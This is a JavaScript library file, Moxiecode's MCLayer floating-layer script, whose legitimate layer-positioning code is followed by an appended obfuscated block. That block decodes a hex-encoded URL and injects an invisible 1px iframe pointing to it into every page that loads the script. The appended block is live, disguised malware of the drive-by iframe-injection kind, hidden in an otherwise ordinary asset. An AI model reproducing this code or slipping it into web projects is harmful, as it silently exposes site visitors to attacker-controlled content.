/**
 * $Id: mclayer.js 18 2006-06-29 14:11:23Z spocke $
 *
 * Moxiecode floating layer script.
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2006, Moxiecode Systems AB, All rights reserved.
 */

function MCLayer(id) {
	this.id = id;
	this.settings = new Array();
	this.blockerElement = null;
	this.isMSIE = navigator.appName == "Microsoft Internet Explorer";
	this.events = false;
	this.autoHideCallback = null;
}

MCLayer.prototype = {
	moveRelativeTo : function(re, p, a) {
		var rep = this.getAbsPosition(re);
		var w = parseInt(re.offsetWidth);
		var h = parseInt(re.offsetHeight);
		var x, y;

		switch (p) {
			case "tl":
				break;

			case "tr":
				x = rep.absLeft + w;
				y = rep.absTop;
				break;

			case "bl":
				break;

			case "br":
				break;
		}

		this.moveTo(x, y);
	},

	moveBy : function(dx, dy) {
		var e = this.getElement();
		var x = parseInt(e.style.left);
		var y = parseInt(e.style.top);

		e.style.left = (x + dx) + "px";
		e.style.top = (y + dy) + "px";

		this.updateBlocker();
	},

	moveTo : function(x, y) {
		var e = this.getElement();

		e.style.left = x + "px";
		e.style.top = y + "px";

		this.updateBlocker();
	},

	show : function() {
		MCLayer.visibleLayer = this;

		this.getElement().style.display = 'block';
		this.updateBlocker();
	},

	hide : function() {
		this.getElement().style.display = 'none';
		this.updateBlocker();
	},

	setAutoHide : function(s, cb) {
		this.autoHideCallback = cb;
		this.registerEventHandlers();
	},

	getElement : function() {
		return document.getElementById(this.id);
	},

	updateBlocker : function() {
		if (!this.isMSIE)
			return;

		var e = this.getElement();
		var b = this.getBlocker();
		var x = this.parseInt(e.style.left);
		var y = this.parseInt(e.style.top);
		var w = this.parseInt(e.offsetWidth);
		var h = this.parseInt(e.offsetHeight);

		b.style.left = x + 'px';
		b.style.top = y + 'px';
		b.style.width = w + 'px';
		b.style.height = h + 'px';
		b.style.display = e.style.display;
	},

	getBlocker : function() {
		if (!this.blockerElement) {
			var d = document, b = d.createElement("iframe");

			b.style.cssText = 'display: none; left: 0px; position: absolute; top: 0';
			b.src = 'javascript:false;';
			b.frameBorder = '0';
			b.scrolling = 'no';

			d.body.appendChild(b);
			this.blockerElement = b;
		}

		return this.blockerElement;
	},

	getAbsPosition : function(n) {
		var p = {absLeft : 0, absTop : 0};

		while (n) {
			p.absLeft += n.offsetLeft;
			p.absTop += n.offsetTop;
			n = n.offsetParent;
		}

		return p;
	},

	registerEventHandlers : function() {
		if (!this.events) {
			var d = document;

			this.addEvent(d, 'mousedown', MCLayer.prototype.onMouseDown);

			this.events = true;
		}
	},

	addEvent : function(o, n, h) {
		if (o.attachEvent)
			o.attachEvent("on" + n, h);
		else
			o.addEventListener(n, h, false);
	},

	onMouseDown : function(e) {
		e = typeof(e) == "undefined" ? window.event : e;
		var b = document.body;
		var l = MCLayer.visibleLayer;

		if (l) {
			var mx = l.isMSIE ? e.clientX + b.scrollLeft : e.pageX;
			var my = l.isMSIE ? e.clientY + b.scrollTop : e.pageY;
			var el = l.getElement();
			var x = parseInt(el.style.left);
			var y = parseInt(el.style.top);
			var w = parseInt(el.offsetWidth);
			var h = parseInt(el.offsetHeight);

			if (!(mx > x && mx < x + w && my > y && my < y + h)) {
				MCLayer.visibleLayer = null;

				if (l.autoHideCallback && l.autoHideCallback(l, e, mx, my))
					return true;

				l.hide();
			}
		}
	},

	addCSSClass : function(e, c) {
		this.removeCSSClass(e, c);
		var a = this.explode(' ', e.className);
		a[a.length] = c;
		e.className = a.join(' ');
	},

	removeCSSClass : function(e, c) {
		var a = this.explode(' ', e.className), i;

		for (i=0; i<a.length; i++) {
			if (a[i] == c)
				a[i] = '';
		}

		e.className = a.join(' ');
	},

	explode : function(d, s) {
		var ar = s.split(d);
		var oar = new Array();

		for (var i = 0; i<ar.length; i++) {
			if (ar[i] != "")
				oar[oar.length] = ar[i];
		}

		return oar;
	},

	parseInt : function(s) {
		if (s == null || s == '')
			return 0;

		return parseInt(s);
	}
}

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}